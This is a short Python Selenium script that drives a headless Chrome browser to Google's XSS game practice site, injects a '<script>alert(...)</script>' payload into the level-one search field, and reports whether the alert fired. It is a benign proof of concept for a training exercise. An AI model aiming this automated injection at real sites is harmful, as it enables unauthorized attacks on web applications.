from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager

from colorama import Fore
import random
import string
import time


URL = "https://xss-game.appspot.com/level1"
RANDOM_VALUE = ''.join(random.choices(string.digits, k=10))
XSS_PAYLOAD = f"<script>alert({RANDOM_VALUE});</script>"


def get_driver():
    """
    This function create a hidden driver and load url into it.

    :return: a driver object
    """
    # make driver hidden
    options = webdriver.ChromeOptions()
    options.add_argument('headless')
    options.add_argument('window-size=1920x1080')
    options.add_argument("disable-gpu")

    driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()), options=options)

    # driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()))
    driver.get(URL)

    return driver


def get_element(driver, element_name):
    """
    This function returns web element to attack
    :param driver: the ChromeDriver
    :param element_name: the name of the element
    :return: object to attack
    """
    return driver.find_element(By.NAME, element_name)


def attack(element):
    """
    This function inject a xss payload to the element and submit the form
    :param element: element to attack
    :return: None
    """
    element.send_keys(XSS_PAYLOAD)
    element.send_keys(Keys.RETURN)


def report(driver):
    """
    This function report if the attack succeed
    :param driver: the web driver instance
    :return: None
    """

    alert = driver.switch_to.alert
    alert_text = alert.text
    alert.accept()

    if RANDOM_VALUE in alert_text:
        print(Fore.GREEN + "[*] successfully injected xss payload\n")
    else:
        print(Fore.RED + "[*] failed to inject xss payload\n")


def main():
    driver = get_driver()

    main_window = driver.window_handles[0]
    iframe = driver.find_elements(By.TAG_NAME, 'iframe')[0]

    driver.switch_to.frame(iframe)

    attack(get_element(driver, "query"))

    driver.switch_to.window(main_window)
    time.sleep(1)

    report(driver)
    driver.quit()


if __name__ == '__main__':
    main()
